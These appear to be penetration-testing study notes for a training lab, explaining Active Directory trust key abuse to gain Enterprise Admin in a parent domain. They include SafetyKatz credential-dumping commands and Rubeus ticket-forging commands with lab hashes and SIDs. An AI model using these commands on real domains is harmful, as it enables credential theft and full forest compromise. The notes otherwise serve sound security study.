**Trust Key Abuse** (also known as a **Cross-Domain Trust Attack**) is a method used by attackers to move from a compromised child domain to the forest root (parent domain) and eventually gain **Enterprise Admin** rights.

### How it Works

When domains are linked in a forest, they share a "secret" called a **Trust Key**.

1. **Compromise**: The attacker takes over a Child Domain Controller.
2. **Steal**: They extract the **Trust Key** (the NTLM hash of the trust account, e.g., `PARENT$`).
3. **Forge**: Using that key, the attacker creates a fake **Inter-realm TGT**.
4. **Escalate**: Crucially, they add the **SID** of the "Enterprise Admins" group (from the parent domain) into the **sIDHistory** field of that ticket.
5. **Access**: The Parent Domain Controller sees the ticket, sees it's signed with the correct Trust Key, and accepts the attacker as a full Enterprise Admin.

## Diagram 

```
Priv Esc - Enterprise Admins - Trust Key Abuse
    ==============================================

      [ CHILD DOMAIN ]          TRUST BOUNDARY         [ PARENT DOMAIN ]
             |                        |                       |
      +--------------+                |                +--------------+
      |   Child DC   | <------ (Implicit Trust) -----> |   Parent DC  |
      +--------------+         (Trust Key)             +--------------+
             ^                        |                ^      |
             |                        |                |      |
      (1-4) Kerberos                  |        (5) Present Inter-realm TGT
       Auth Flow                      |        (6) Issue ST (if validated)
             |                        |                |      |
             v                        |                v      v
      +--------------+                |                +--------------+
      |    CLIENT    | ------------------------------> |  APP SERVER  |
      |  (Attacker)  |         (7) Present ST          +--------------+
      +--------------+                                 
             ^
             | [ ATTACK STEPS ]
             | i.  Acquire NTLM hash of target trust account
             | ii. Forge referral ticket (ST/TGS) using trust secret
```


---

* So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent on the DC.
```
SafetyKatz.exe "lsadump::trust /patch"
```

```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"
```

```
SafetyKatz.exe "lsadump::lsa /patch"
```

## Using Rubeus

* Forge an inter-realm TGT using Rubeus
```
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL
/rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

* Use the forged ticket
```
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>
```



| Options                                           | Use                                                     |
| ------------------------------------------------- | ------------------------------------------------------- |
| silver                                            | Name of the module                                      |
| /rc4:17e8f4d3f4b46e95048a66a5dd890ee3             | NTLM hash of the trust key                              |
| /sid:S-1-5-21-719815819-3726368948-3917688648     | SID of the current domain                               |
| /sids:S-1-5-21-335606122-960912869-3279953914-519 | SID of the enterprise admins group of the parent domain |
| /ldap                                             | Retrieve PAC information from the current domain DC     |
| /user:Administrator                               | Username for which the TGT is generated                 |
| /nowrap                                           | No newlines in the output                               |



